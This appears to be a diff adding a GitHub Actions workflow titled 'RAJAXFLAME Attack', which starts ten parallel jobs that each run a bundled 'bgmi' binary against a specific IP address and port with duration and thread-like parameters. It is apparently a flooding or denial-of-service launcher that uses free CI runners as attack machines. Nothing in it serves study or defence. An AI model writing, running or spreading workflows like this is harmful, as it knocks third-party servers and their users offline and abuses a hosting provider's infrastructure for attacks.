@@ -1,0 +1,84 @@
+name: RAJAXFLAME Attack
+'on':
+  workflow_dispatch: {}
+jobs:
+  attack-session-1:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
+  attack-session-2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
+  attack-session-3:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
+  attack-session-4:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
+  attack-session-5:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
+  attack-session-6:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
+  attack-session-7:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
+  attack-session-8:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
+  attack-session-9:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
+  attack-session-10:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Setup and Run
+      run: chmod +x bgmi && ./bgmi 4.213.65.190 17710 120 4000
